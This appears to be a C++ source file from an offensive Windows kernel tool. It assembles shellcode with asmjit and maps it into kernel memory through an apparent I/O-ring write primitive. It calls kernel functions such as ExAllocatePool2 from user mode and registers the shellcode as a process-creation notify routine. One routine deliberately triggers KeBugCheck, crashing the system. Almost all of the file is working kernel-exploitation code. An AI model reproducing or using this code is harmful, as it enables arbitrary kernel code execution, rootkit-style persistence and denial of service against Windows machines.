#include "kernel.hpp"
#include "win_defs.h"
#include <phnt_windows.h>
#include <phnt.h>

#include <asmjit/x86.h>

using namespace asmjit;
namespace collat::kernel {
    void* map_krnl_shellcode(char* shellcode, size_t scsize) ;
}

namespace collat::shellcode
{

    class Assembler : public x86::Assembler
    {
    public:
        Assembler(CodeHolder *code = nullptr) : x86::Assembler(code) {}

        template <typename T>
        inline void call_absolute(T ptr)
        {
            mov(x86::rax, ptr);
            call(x86::rax);
        }
    };

    class Shellcode {
    private:
        JitRuntime rt;
        CodeHolder code;
        Assembler* a;    

        void* kernel_code_ptr = nullptr;

    private:

        
    public:
        Shellcode() : code(), a(nullptr) {

            spdlog::debug("Initializing code holder...");
            Error err = code.init(rt.environment());
            
            if (err != Error::kOk) {
                spdlog::debug("code.init() failed: {}", DebugUtils::error_as_string(err));
            }
            a = new Assembler(&code);
            spdlog::debug("Assembler code holder: {}", (void*)a->code());
            spdlog::debug("Our code holder: {}", (void*)&code);
        }

        ~Shellcode() {
            delete a;
        }

        Assembler& assembler() {
            return *a;
        }

        void* finalize() {

            CodeBuffer& buffer = code.text_section()->buffer();
            

            spdlog::info("Buffer size: {} bytes", buffer.size());

            void* code_ptr = VirtualAlloc(nullptr, (buffer.size() + 0xfff) & 0xf000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            memcpy(code_ptr, buffer.data(), buffer.size());

            DWORD old;
            VirtualProtect(code_ptr, (buffer.size() + 0xfff) & 0xf000, PAGE_EXECUTE, &old);

            /*Error err = rt.add(&code_ptr, &code);
            if((uint64_t)code_ptr & 0xfff != 0) {
                spdlog::warn("asmjit code is not aligned, skipping!");
                return nullptr;
            }
            if(err != Error::kOk) {
                spdlog::error("failed to finalize asmjit, err: {}!", DebugUtils::error_as_string(err));
                return nullptr;
            }*/
            kernel_code_ptr = kernel::map_krnl_shellcode((char*)code.text_section()->data(), code.text_section()->buffer_size());
            return kernel_code_ptr;
        }

        uint64_t run() {
            void* ptr = finalize();
            spdlog::debug("running shellcode @ {}", ptr);
            if(kernel_code_ptr != nullptr) {
                return collat::kernel::call<uint64_t>(ptr);
            }
        }
    };

    void test_process_callback()
    {
        
        Shellcode shellcode;
        auto& a = shellcode.assembler();

        a.mov(x86::rax, 1);
        a.ret();
        //a.mov(x86::r11, x86::rax);

        spdlog::info("Testing sc");
        auto res = shellcode.run();
        spdlog::info("res: {}", res);
        
    }

    void proc_callback_test() {

        HANDLE event = CreateEvent(nullptr, FALSE, FALSE, TEXT("Global\\create_proc_event2"));
        if(event == NULL) {
            spdlog::error("failed to create proc event");
            return;
        }

        wchar_t evt_str[] = L"\\BaseNamedObjects\\Global\\create_proc_event2";

        auto mem = kernel::get_ioring();
        auto pool = kernel::call<char*>("ntoskrnl.exe", "ExAllocatePool2", 0x0000000000000040UI64, 0x1000, 0x1111);

        mem->internal_write((uint64_t)pool, (void*)evt_str, sizeof(evt_str));

        

        kernel::call<uint64_t>("ntoskrnl.exe", "RtlInitUnicodeString", pool+0x100, pool);

        OBJECT_ATTRIBUTES obj_attr = {0};
        InitializeObjectAttributes(&obj_attr, (PUNICODE_STRING)pool+0x100, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

        mem->internal_write((uint64_t)pool + 0x200, &obj_attr, sizeof(obj_attr));

        Shellcode shellcode;
        auto& a = shellcode.assembler();

        a.mov(x86::ecx, 0x69696969);
        a.call_absolute(kmodule::get_export("ntoskrnl.exe", "KeBugCheck"));


        a.mov(x86::rcx, (uint64_t)pool+0x300);
        a.mov(x86::rdx, EVENT_ALL_ACCESS);
        a.mov(x86::r8, pool+0x200);
        a.call_absolute(kmodule::get_export("ntoskrnl.exe", "ZwOpenEvent"));

        a.mov(x86::rcx, x86::ptr_32((uint64_t)pool+0x300));
        a.xor_(x86::rdx, x86::rdx);
        a.call_absolute(kmodule::get_export("ntoskrnl.exe", "ZwSetEvent"));

        a.mov(x86::rcx, x86::ptr_32((uint64_t)pool+0x300));
        a.call_absolute(kmodule::get_export("ntoskrnl.exe", "ZwClose"));

        spdlog::info("setting up");
        void* ptr=shellcode.finalize();
        kernel::call<uint64_t>("ntoskrnl.exe", "PsSetCreateProcessNotifyRoutine", ptr, FALSE);
        while(1) {
            spdlog::info("waiting");
            
            WaitForSingleObject(event, INFINITE);
            spdlog::info("process created!");
        }
    }

}